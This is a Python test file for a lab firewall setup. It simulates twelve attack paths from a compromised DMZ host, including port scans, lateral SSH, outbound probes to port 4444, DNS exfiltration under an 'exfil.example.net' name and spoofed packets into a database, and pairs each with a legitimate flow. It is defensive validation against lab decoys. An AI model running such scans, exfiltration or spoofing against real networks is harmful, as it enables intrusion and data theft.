"""Part 5 of docs/method.md: 12 attack paths from a compromised DMZ host, each paired with a
legitimate flow that must pass in the same run. All traffic stays on lab bridges and targets
only lab decoys. An attack counts as blocked only if its legitimate pair passes."""

import re
import secrets
import time

from expect import APP1, DB, OUTSIDE, RESOLVER, RTR_A_DB, RTR_A_DMZ, RTR_A_LO, RTR_B_LO, RTR_B_WG


def _open_ports(nmap_output: str) -> list[str]:
    return re.findall(r"^(\d+/tcp)\s+open\b", nmap_output, re.M)


def _scan_from_dmz(lab, target: str) -> list[str]:
    return _open_ports(lab.nmap_from_dmz(target))


def _not_open(results: dict[str, str]) -> bool:
    return all(v != "open" for v in results.values())


def test_ap01_scan_db_zone(lab):
    assert lab.tcp("app1", DB, 5432) == "open", "legitimate pair failed: app1 -> db:5432"
    found = _scan_from_dmz(lab, "172.16.40.0/28")
    assert not found, f"open ports in the DB zone seen from the DMZ: {found}"


def test_ap02_direct_db_connection(lab):
    assert lab.tcp("app2", DB, 5432) == "open", "legitimate pair failed: app2 -> db:5432"
    assert lab.tcp_from_dmz(DB, 5432) != "open"


def test_ap03_lateral_ssh_to_app(lab):
    assert lab.tcp("admin", APP1, 22) == "open", "legitimate pair failed: admin -> app1:22"
    got = {ip: lab.tcp_from_dmz(ip, 22) for ip in (APP1, "172.16.30.12")}
    assert _not_open(got), got


def test_ap04_scan_lan_a(lab):
    ok = lab.curl("client-a", "https://www.packetproof.example/")
    assert ok.returncode == 0, f"legitimate pair failed: client-a HTTPS: {ok.stderr}"
    found = _scan_from_dmz(lab, "172.16.10.0/27")
    assert not found, f"open ports in LAN-A seen from the DMZ: {found}"


def test_ap05_ssh_to_router_dmz_gateway(lab):
    assert lab.tcp("admin", RTR_A_LO, 22) == "open", "legitimate pair failed: admin -> rtr-a:22"
    assert lab.tcp_from_dmz(RTR_A_DMZ, 22) != "open"


def test_ap06_ssh_to_router_other_addresses(lab):
    assert lab.tcp("admin", RTR_A_LO, 22) == "open", "legitimate pair failed: admin -> 172.16.255.1:22"
    got = {ip: lab.tcp_from_dmz(ip, 22) for ip in (RTR_A_LO, RTR_A_DB)}
    assert _not_open(got), got


def test_ap07_ssh_to_rtr_b_across_tunnel(lab):
    assert lab.tcp("admin", RTR_B_LO, 22) == "open", "legitimate pair failed: admin -> rtr-b:22"
    got = {ip: lab.tcp_from_dmz(ip, 22) for ip in (RTR_B_LO, RTR_B_WG)}
    assert _not_open(got), got


def test_ap08_scan_lan_b_across_tunnel(lab):
    ok = lab.curl("client-b", "https://www.packetproof.example/")
    assert ok.returncode == 0, f"legitimate pair failed: client-b HTTPS across the tunnel: {ok.stderr}"
    found = _scan_from_dmz(lab, "172.24.10.0/28")
    assert not found, f"open ports in LAN-B seen from the DMZ: {found}"


def test_ap09_outbound_to_outside(lab):
    ok = lab.sh("client-a", f"curl -sS --max-time 10 http://{OUTSIDE}/").stdout
    assert "outside saw" in ok, "legitimate pair failed: client-a -> outside"
    lab.capture("outside", "ap09", "tcp[tcpflags] & tcp-syn != 0 and (dst port 443 or dst port 4444)", 12)
    got = {port: lab.tcp_from_dmz(OUTSIDE, port) for port in (443, 4444)}
    time.sleep(11)
    seen = lab.captured("outside", "ap09")
    assert _not_open(got), got
    assert not seen, f"SYNs from the DMZ reached the outside host: {seen[:5]}"


def test_ap10_dns_exfiltration_through_resolver(lab):
    marker = "pp" + secrets.token_hex(6)
    status, answers = lab.dig("client-a", RESOLVER, f"legit{marker}.example.net")
    assert answers == [OUTSIDE], f"legitimate pair failed: client-a recursion via the resolver: {status}"
    lab.dig("", RESOLVER, f"{marker}.exfil.example.net", via_dmz=True)
    log = lab.sh("outside", "cat /tmp/dnsmasq.log").stdout
    assert f"legit{marker}" in log, "the outside DNS log did not record the legitimate query"
    assert f"{marker}.exfil" not in log, "data hidden in a DNS name reached the outside"


def test_ap11_dns_direct_to_outside(lab):
    marker = "pp" + secrets.token_hex(6)
    status, answers = lab.dig("resolver", OUTSIDE, f"r{marker}.example.net")
    assert answers == [OUTSIDE], f"legitimate pair failed: resolver -> outside DNS: {status}"
    status, answers = lab.dig("", OUTSIDE, f"{marker}.exfil.example.net", via_dmz=True)
    log = lab.sh("outside", "cat /tmp/dnsmasq.log").stdout
    assert not answers, f"the DMZ got a DNS answer from the outside: {answers}"
    assert f"{marker}.exfil" not in log, "a direct DNS query from the DMZ reached the outside"


def test_ap12_spoofed_source_into_db(lab):
    assert lab.tcp("app1", DB, 5432) == "open", "legitimate pair failed: real app1 -> db:5432"
    before = lab.nft_counter("rtr-a", "inet pp antispoof")
    lab.capture("db", "ap12", f"src host {APP1} and src port 31337", 8)
    lab.spoof_from("dmz", APP1, DB, 5432)
    time.sleep(7)
    seen = lab.captured("db", "ap12")
    after = lab.nft_counter("rtr-a", "inet pp antispoof")
    assert not seen, f"spoofed packets reached db: {seen}"
    assert after > before, f"rtr-a's reverse-path counter did not move ({before} -> {after})"

